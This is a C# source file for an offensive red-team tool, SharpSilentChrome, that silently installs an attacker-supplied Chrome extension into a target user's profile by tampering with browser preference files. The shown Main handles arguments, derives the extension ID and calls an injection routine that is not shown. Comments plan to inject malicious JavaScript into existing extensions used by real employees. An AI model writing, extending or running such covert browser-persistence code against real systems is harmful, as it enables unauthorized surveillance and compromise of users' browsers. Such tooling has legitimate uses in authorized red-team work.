using System;
using System.IO;
using System.Text;
using System.Linq;
using System.Security.Cryptography;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

using static SharpSilentChrome.ChromeExtensionInstaller;

/*
 *  TODO: 
 *  1. Option to inject into existing extension -> I... have no idea how to do this tbh, so... not sure 
 *      - Also, how the fuck do we clean up/revert this? Like, when executing this in real world red team against real employees... 
 *      - How do we uninject(?) malicious javascript code from existing extensions? 
 *      - Any availability issues? Like, end user's extension going boink? 
 *  2. Terminate chrome, and then restart chrome (with all the fancy flags, I think) 
 *  3. Backup json files & revert command 
 *  4. Change encode_install_time 
 *  5. Add more preference files to edge (firefox? not sure) 
 *  
 *  .\SharpSilentChrome.exe /user:us\low /sid:S-1-5-21-2888908146-1342698428-1910144870-1001 /path:"C:\Users\Public\Downloads\extension"
 *  .\SharpSilentChrome.exe /user:root /sid:S-1-5-21-2888908146-1342698428-1910144870-1001 /path:"C:\Users\Public\Downloads\extension"
 */

namespace SharpSilentChrome
{
    class SharpSilentChrome
    {
        static void Main(string[] args)
        {
            string user = null, sid = null, extensionPath = null;

            // Argument parsing + lazy hardcoding 
            foreach (var arg in args)
            {
                if (arg.StartsWith("/user:", StringComparison.OrdinalIgnoreCase))
                    user = arg.Substring(6).Trim('"');
                else if (arg.StartsWith("/sid:", StringComparison.OrdinalIgnoreCase))
                    sid = arg.Substring(5).Trim('"');
                else if (arg.StartsWith("/path:", StringComparison.OrdinalIgnoreCase))
                    extensionPath = arg.Substring(6).Trim('"');
                else if (arg.Equals("/?", StringComparison.OrdinalIgnoreCase) || arg.Equals("/help", StringComparison.OrdinalIgnoreCase))
                {
                    ShowUsage();
                    return;
                }
            }

            if (string.IsNullOrWhiteSpace(user) || string.IsNullOrWhiteSpace(sid) || string.IsNullOrWhiteSpace(extensionPath))
            {
                ShowUsage();
                return;
            }

            var extensionId = GetExtensionId(extensionPath);

            Console.WriteLine($"[+] User: {user}");
            Console.WriteLine($"[+] SID: {sid}");
            Console.WriteLine($"[+] Extension Path: {extensionPath}");
            Console.WriteLine($"[+] ExtID: {extensionId}");
            Console.WriteLine("");

            // Find chrome preferences file 
            var userProfilePath = GetChromePreferencesPathFromSid(sid);
            if (userProfilePath == null)
            {
                Console.WriteLine("[-] Could not find Chrome preferences file");
                return;
            }

            // Trim the sid's last "-" part, then start injecting 
            sid = sid.Substring(0, sid.LastIndexOf('-'));
            InjectExtensionToFiles(user, sid, extensionPath, extensionId, userProfilePath);
        }

        static void ShowUsage()
        {
            Console.WriteLine("Usage: SharpSilentChrome.exe /user:<username> /sid:<SID> /path:<extension_path>");
            Console.WriteLine("Example: SharpSilentChrome.exe /user:john /sid:S-1-5-21-1234567890-1234567890-1234567890-1000 /path:\"C:\\extensions\\myextension\"");
        }

        static string GetExtensionId(string path)
        {
            var bytes = Encoding.Unicode.GetBytes(path);
            using (var sha = SHA256.Create())
            {
                var hash = sha.ComputeHash(bytes);
                var hex = BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
                var sb = new StringBuilder();
                foreach (var c in hex)
                {
                    int val = Convert.ToInt32(c.ToString(), 16);
                    sb.Append((char)(val + 'a'));
                    if (sb.Length == 32) break;
                }
                return sb.ToString();
            }
        }
    }
}
